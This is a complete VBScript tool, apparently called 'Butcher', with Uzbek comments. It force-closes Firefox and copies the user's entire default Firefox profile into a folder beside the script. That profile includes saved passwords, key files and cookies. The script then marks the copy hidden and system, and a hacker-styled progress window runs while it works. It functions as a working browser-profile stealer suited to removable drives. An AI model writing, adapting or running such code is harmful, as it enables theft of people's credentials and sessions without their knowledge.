Option Explicit

Dim fso, shell, userProfile, scriptPath, backupFolder, sourceFolder
Dim totalSize, copiedSize, ie, profilesFolder, profileFolder

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Firefox processini to'xtatish
On Error Resume Next
shell.Run "taskkill /IM firefox.exe /F", 0, True
On Error GoTo 0

userProfile = shell.ExpandEnvironmentStrings("%USERPROFILE%")
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)
backupFolder = scriptPath & "\Backup_Firefox"
If Not fso.FolderExists(backupFolder) Then fso.CreateFolder(backupFolder)

' Firefox profil papkasi
profilesFolder = userProfile & "\AppData\Roaming\Mozilla\Firefox\Profiles\"

' Default-release profilni topish
profileFolder = ""
Dim folder
For Each folder In fso.GetFolder(profilesFolder).SubFolders
   If InStr(LCase(folder.Name), ".default-release") > 0 Then
    profileFolder = folder.Path
    Exit For
End If
Next

If profileFolder = "" Then
    MsgBox "Firefox default profil topilmadi!"
    WScript.Quit
End If

sourceFolder = profileFolder

If fso.FolderExists(sourceFolder) Then
    totalSize = GetFolderSize(sourceFolder)
    copiedSize = 0

    ' Hacker style progress oynasi yaratish
    Set ie = CreateObject("InternetExplorer.Application")
    ie.Visible = True
    ie.Toolbar = False
    ie.StatusBar = False
    ie.Width = 1000
    ie.Height = 400
    ie.Left = 400
    ie.Top = 150
    ie.Navigate("about:blank")
    Do While ie.Busy Or ie.ReadyState <> 4
        WScript.Sleep 100
    Loop

    ie.Document.Write "<html><head><title>Butcher</title></head>" & _
        "<body style='font-family:Courier New; background:black; color:#00FF00; text-align:center; overflow:hidden;'>" & _
        "<h1 style='color:#00FF00;'>BUTCHER STARTED</h1>" & _
        "<div style='width:90%;height:35px;border:2px solid #00FF00;margin:auto;'>" & _
        "<div id='bar' style='width:0%;height:100%;background:#00FF00; transition: width 0.3s;'></div></div><br/>" & _
        "<pre id='log' style='text-align:left; width:90%; margin:auto; height:180px; overflow-y:auto; background:#000; color:#00FF00; border:1px solid #00FF00; padding:5px;'></pre>" & _
        "<p id='percent'>0%</p>" & _
        "</body></html>"
    ie.Document.Close

    ' Fayllarni nusxalash
    CopyFolderWithLiveProgress sourceFolder, backupFolder & "\Default-Release"

    Do While ie.Busy Or ie.ReadyState <> 4
        WScript.Sleep 100
    Loop
    ie.Document.Body.InnerHTML = "<h2 style='color:#00FF00;'>COMPLETED!</h2>"
    WScript.Sleep 500

    On Error Resume Next
    If Not ie Is Nothing Then
        ie.Quit
        Set ie = Nothing
    End If
    On Error GoTo 0
End If

fso.GetFolder(backupFolder).Attributes = 2 + 4

' --- Functions ---
Function GetFolderSize(folderPath)
    Dim folder, file, subSize
    subSize = 0
    For Each file In fso.GetFolder(folderPath).Files
        subSize = subSize + file.Size
    Next
    For Each folder In fso.GetFolder(folderPath).SubFolders
        subSize = subSize + GetFolderSize(folder.Path)
    Next
    GetFolderSize = subSize
End Function

Sub CopyFolderWithLiveProgress(src, dst)
    Dim folder, file, percent, updateCounter
    If Not fso.FolderExists(dst) Then fso.CreateFolder(dst)
    updateCounter = 0

    For Each file In fso.GetFolder(src).Files
        fso.CopyFile file.Path, dst & "\", True
        copiedSize = copiedSize + file.Size
        updateCounter = updateCounter + 1

        ' Har 5 fayldan keyin progressni yangilash
        If updateCounter >= 5 Then
            percent = Int((copiedSize / totalSize) * 100)
            UpdateProgress percent, file.Name
            WScript.Sleep 50
            updateCounter = 0
        End If
    Next

    For Each folder In fso.GetFolder(src).SubFolders
        CopyFolderWithLiveProgress folder.Path, dst & "\" & folder.Name
    Next

    If updateCounter > 0 Then
        percent = Int((copiedSize / totalSize) * 100)
        UpdateProgress percent, "Finalizing..."
        WScript.Sleep 50
    End If
End Sub

Sub UpdateProgress(p, fname)
    On Error Resume Next
    ie.Document.GetElementById("bar").Style.Width = p & "%"
    ie.Document.GetElementById("percent").innerText = p & "%"

    ' Logni yangilash
    Dim logElem
    Set logElem = ie.Document.GetElementById("log")
    logElem.innerHTML = "Copying: " & fname & "<br>" & logElem.innerHTML

    ' Scroll pastga tushishi
    ie.Document.parentWindow.Scroll 0, 10000
End Sub
